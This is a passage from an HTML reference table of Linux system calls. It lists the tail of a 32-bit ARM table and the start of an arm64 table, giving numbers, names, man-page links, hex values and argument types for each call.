sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">381</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x17d</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">382</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x17e</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">383</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x17f</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">384</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x180</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">385</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x181</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">386</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x182</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">387</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x183</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">388</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x184</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">389</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x185</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">390</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x186</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">391</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x187</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">392</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x188</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">393</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x189</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">394</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x18a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">395</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x18b</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">396</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x18c</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">397</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x18d</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr><tr><td align="center">983041</td><td>ARM_breakpoint</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_breakpoint.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_breakpoint">cs/</a></td><td align="center">0xf0001</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983042</td><td>ARM_cacheflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_cacheflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_cacheflush">cs/</a></td><td align="center">0xf0002</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983043</td><td>ARM_usr26</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr26.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr26">cs/</a></td><td align="center">0xf0003</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983044</td><td>ARM_usr32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr32">cs/</a></td><td align="center">0xf0004</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">983045</td><td>ARM_set_tls</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_set_tls.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_set_tls">cs/</a></td><td align="center">0xf0005</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h1 id="0x4-arm64-64bit"><a href="#0x4-arm64-64bit" class="headerlink" title="0x4 arm64-64bit"></a>0x4 arm64-64bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%x8</th><th>arg0 (%x0)</th><th>arg1 (%x1)</th><th>arg2 (%x2)</th><th>arg3 (%x3)</th><th>arg4 (%x4)</th><th>arg5 (%x5)</th></tr></thead><tbody><tr><td align="center">0</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0x00</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0x01</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0x02</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0x03</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0x04</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">5</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0x05</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">6</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0x06</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">7</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0x07</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">8</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0x08</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0x09</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0x0a</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0x0b</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0x0c</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0x0d</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0x0e</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0x0f</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0x10</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0x11</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">18</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0x12</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">19</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x13</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x14</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0x15</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">22</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x16</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">23</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x17</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x18</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x19</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">26</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x1a</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x1b</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x1c</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">29</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x1d</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x1e</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x1f</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">32</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x20</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">33</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x21</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x22</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x23</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">36</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x24</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x25</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">38</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x26</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x27</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">40</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x28</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">41</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0x29</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0x2a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">43</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x2b</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x2c</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">45</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x2d</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x2e</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x2f</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x30</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x31</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x32</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x33</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x34</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">53</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x35</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">54</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x36</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">55</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x38</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">57</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x39</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">59</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a 